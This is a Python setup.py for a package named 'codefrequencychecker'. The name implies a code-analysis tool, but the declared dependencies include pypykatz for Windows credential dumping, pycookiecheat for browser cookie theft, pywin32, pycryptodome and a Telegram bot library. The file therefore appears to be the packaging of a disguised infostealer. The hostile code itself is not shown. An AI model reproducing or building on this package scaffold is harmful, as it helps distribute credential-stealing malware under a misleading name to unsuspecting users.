from setuptools import setup, find_packages

setup(
    name="codefrequencychecker",
    version="0.0.5",
    packages=find_packages(),
    install_requires=[
    "pyTelegramBotAPI>=4.12.0",
    "pycryptodome>=3.17",
    "pywin32>=305",
    "pypykatz>=0.4.0",
    "pycookiecheat>=0.6"
],

    entry_points={
        "console_scripts": [
            "codefrequencychecker=main:main",  # <--- main function here
        ],
    },
)
